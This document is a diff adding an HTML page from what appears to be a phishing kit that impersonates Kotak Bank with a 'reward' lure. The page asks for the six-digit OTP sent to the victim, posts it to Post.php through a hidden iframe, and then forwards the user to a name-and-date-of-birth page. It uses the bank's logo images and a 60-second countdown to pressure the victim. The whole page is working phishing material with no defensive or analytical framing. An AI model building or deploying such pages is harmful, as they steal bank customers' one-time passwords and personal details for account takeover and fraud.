@@ -1,0 +1,227 @@
+<!DOCTYPE html>
+<html lang="en" >
+<head>
+  <meta charset="UTF-8">
+  <title>Kotak Bank Reward | Enter OTP</title>
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="author" content="Syahrizaldev">
+<title></title>
+<link rel="stylesheet" href="./style.css">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Heebo:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+<style type="text/css">
+#Lg
+{
+  width:180px;
+  margin-bottom:10px;
+  margin-top:25px;
+}
+#Lg2
+{
+  width:155px;
+  position:absolute;
+  margin-top:0%;
+  margin-left:40%;
+  margin-top:24px;
+}
+#Lg3
+{
+  width:100%;
+  margin-top:10%;
+}
+
+div.c
+{
+    line-height: 160%;
+}
+div.cnt
+{
+    line-height: 120%;
+}
+.c
+{
+    font-size:14px; 
+    font-family: 'Heebo', sans-serif; 
+    font-weight:100;  
+    margin-top:50px;
+    color:#040404;
+}
+div.footer
+{
+    line-height: 90%;
+}
+
+#captcha
+{
+  width:143.4px;
+  height:35px;
+  font-size:14px;
+  font-family: 'Heebo', sans-serif;
+  border-style:solid;
+  border-color:black;
+  border-width:1px;
+  border-radius:4px;
+  outline:none;
+  padding:0 10px;
+  text-transform:none;
+}
+.btn
+{
+  width:120px;
+  padding:6px 10px;
+  border-style:solid;
+  outline:none;
+  border:none;
+  border-radius:4px;
+  color:#fff;
+  font-family: 'Heebo', sans-serif;
+  font-weight:500;
+  font-size:14px;
+  background-color:#EE1C25;
+  margin-top:12px;
+  margin-left:58%;
+}
+hr.hr
+{
+  width:116%;
+  margin-left:-8%;
+  border-style:solid;
+  border-color:grey;
+  border-width:0.5px;
+  margin-top:25%;
+  }
+  
+.checkbox-wrapper-46 input[type="checkbox"] {
+  display: none;
+  visibility: hidden;
+}
+
+.checkbox-wrapper-46 .cbx {
+  margin: auto;
+  -webkit-user-select: none;
+  user-select: none;
+  cursor: pointer;
+}
+.checkbox-wrapper-46 .cbx span {
+  display: inline-block;
+  vertical-align: middle;
+  transform: translate3d(0, 0, 0);
+}
+.checkbox-wrapper-46 .cbx span:first-child {
+  position: relative;
+  width: 16px;
+  height: 16px;
+  border-radius: 2px;
+  transform: scale(1);
+  vertical-align: middle;
+  border: 1px solid grey;
+  transition: all 0.3s ease;
+}
+.checkbox-wrapper-46 .cbx span:first-child svg {
+  position: absolute;
+  top: 2px;
+  left: 1px;
+  fill: none;
+  stroke: #FFFFFF;
+  stroke-width: 0.75;
+  stroke-linecap: round;
+  stroke-linejoin: round;
+  stroke-dasharray: 16px;
+  stroke-dashoffset: 16px;
+  transition: all 0.3s ease;
+  transition-delay: 0.1s;
+  transform: translate3d(0, 0, 0);
+}
+.checkbox-wrapper-46 .cbx span:first-child:before {
+  content: "";
+  width: 100%;
+  height: 100%;
+  background: #0070e0;
+  display: block;
+  transform: scale(0);
+  opacity: 1;
+  border-radius: 50%;
+}
+.checkbox-wrapper-46 .cbx span:last-child {
+  padding-left: 10px;
+}
+.checkbox-wrapper-46 .cbx:hover span:first-child {
+  border-color: grey;
+}
+
+.checkbox-wrapper-46 .inp-cbx:checked + .cbx span:first-child {
+  background: #0070e0;
+  border-color: #0070e0;
+  animation: wave-46 0.4s ease;
+}
+.checkbox-wrapper-46 .inp-cbx:checked + .cbx span:first-child svg {
+  stroke-dashoffset: 0;
+}
+.checkbox-wrapper-46 .inp-cbx:checked + .cbx span:first-child:before {
+  transform: scale(3.5);
+  opacity: 0;
+  transition: all 0.6s ease;
+}
+
+@keyframes wave-46 {
+  50% {
+    transform: scale(0.9);
+  }
+}
+</style>
+</head>
+<body onload="startTimer();">
+<!-- Static- Please don't do anything here-->
+  <script type="text/javascript">var submitted=false;</script>
+  <iframe name="hidden_iframe" id="hidden_iframe" style="display: none" onload="if(submitted){window.location='Name_And_DOB.html';}"></iframe>
+<!-- partial:index.partial.html -->
+<section class="sectioncontact-section" style="background-color:#FAFAFA;">
+	<div class="container contact-column">
+		<img src="Kotak_Logo.jpg" alt="" id="Lg" >
+		<form class="contact-inform form" action="Post.php" method="post" target="hidden_iframe" onsubmit="submitted=true">
+		    <div class="c">
+		    <h1>Enter OTP sent via SMS and email</h1>
+			</div><br>
+			<div class="cnt">
+			<p1 style="color:grey; font-size:14px; font-family: 'Heebo', sans-serif; font-weight:400;">Enter the 6-digit OTP send to your registered mobile number and email.</p1><br><br>
+			</div>
+			<div class="form-control">
+				<input type="text" name="CRN_OTP" class="form-input" placeholder="Enter OTP" maxlength="6" 
+				pattern="[0-9]\d{5}" title="Please enter valid OTP !" required="">
+				<label for="OTP" class="form-label">OTP</label>
+			</div>
+			<center><p1 style="color:grey; font-size:14px; font-family: 'Heebo', sans-serif; text-align:center;"><span style="color:grey; font-family: 'Heebo', sans-serif; font-weight:400; font-size:13px;" id="time"></span>
+			<span style="color:grey; font-size:14px; font-family: 'Heebo', sans-serif; font-weight:400; text-align:center;">&nbsp;second</span></p1></center>
+			<script type="text/javascript">
+			var timer=60;
+			var sec=0;
+			function startTimer() {
+			sec=parseInt(timer%60);
+			
+			if (timer<2) {
+			// timer.stop();
+			window.location.href = "CRN_OTP_Expire.html";
+			}
+			
+			document.getElementById("time").innerHTML = "<p1> Your OTP will expire in  : </p1>"+sec.toString();
+			timer--;
+			setTimeout(function(){
+			startTimer();
+			
+			}, 1000);
+			}
+			
+			</script>
+			<div class="footer">
+			<a style="color:grey; font-size:12px; font-family: 'Heebo', sans-serif; font-weight:300; text-decoration: underline;" href="CRN_OTP_Again.html">Didn't receive OTP?</a>
+			</div><br>
+			<a style="color:#00b4ef; font-size:12px; font-family: 'Heebo', sans-serif; font-weight:400; text-decoration: none;" href="Card_Methods.html">More login options</a>
+			<hr class="hr">
+			<button type="submit" class="btn">Secure Login</button>
+</section>
+            <img src="Kotak_Footer.jpg" alt="" id="Lg3" > 
+</body>
+</html>
